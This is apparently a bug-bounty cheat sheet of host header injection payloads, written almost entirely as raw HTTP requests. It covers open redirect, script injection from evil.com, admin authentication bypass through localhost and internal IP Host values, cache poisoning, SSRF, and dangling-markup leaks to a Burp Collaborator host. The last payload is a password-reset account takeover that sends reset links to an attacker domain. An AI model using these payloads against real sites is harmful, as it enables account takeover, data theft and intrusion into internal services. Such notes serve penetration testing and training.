# Host Header Atttack

### Host Poisoing = Open Redirect

```http
Host: evil.com

Responce:

Location: https://evil.com
```

### Host Poisoing = XSS

```http
Host: evil.com

Responce:

<script src=//evil.com/source.js>
```

### Host Header Authentication Bypass
```http
GET /admin HTTP/1.1
Host: localhost
```

```http
GET /admin HTTP/1.1
Host: 192.168.0.1/24 <-- Intruder
```

### Cache Poisoning via Ambiguous Request

```http
GET /admin HTTP/1.1
Host: victim.host.com
Host: SUBDOMAIN.burpcollaborator.net
```

### SSRF via Flawed Request Parsing

```http
GET https://victim.host.com HTTP/1.1
Host: SUBDOMAIN.burpcollaborator.net
```
If you received HTTP request, test:

```http
GET https://victim.host.com HTTP/1.1
Host: 192.168.0.1/24 <-- Intruder
```

### Dangling Markup

```http
GET /admin HTTP/1.1
Host: victim.host.com:'<a href="//SUBDOMAIN.burpcollaborator.net/?
```

```http
POST /member/getpassword HTTP/1.1
Host: victim.host.com:'<a href="//SUBDOMAIN.burpcollaborator.net/?
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 Safari/537.3
Content-Type: application/x-www-form-urlencoded

email=alice@livemail.com
```

### Host Validation Bypass via connection state attack

Burp Suite > Repeater > + > Create Tab Group > 1 & 2

1:
```
GET / HTTP/1.1
Host: victim.host.com
```
2:
GET / HTTP/1.1
Host: 192.168.0.1/24 <-- Intruder
or
Host: localhost <-- Intruder
Host: SUBDOMAIN.burpcollaborator.net
Host: victim.host.com:'<a href="//SUBDOMAIN.burpcollaborator.net/?
...
Host: victim.host.com
Host: SUBDOMAIN.burpcollaborator.net

```
# P2 HIGH Account Takeover
```http
POST /member/getpassword HTTP/1.1
Host: SUBDOMAIN.burpcollaborator.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 Safari/537.3
Content-Type: application/x-www-form-urlencoded

email=alice@livemail.com
```

https://application.security/free-application-security-training/owasp-top-10-host-header-injection
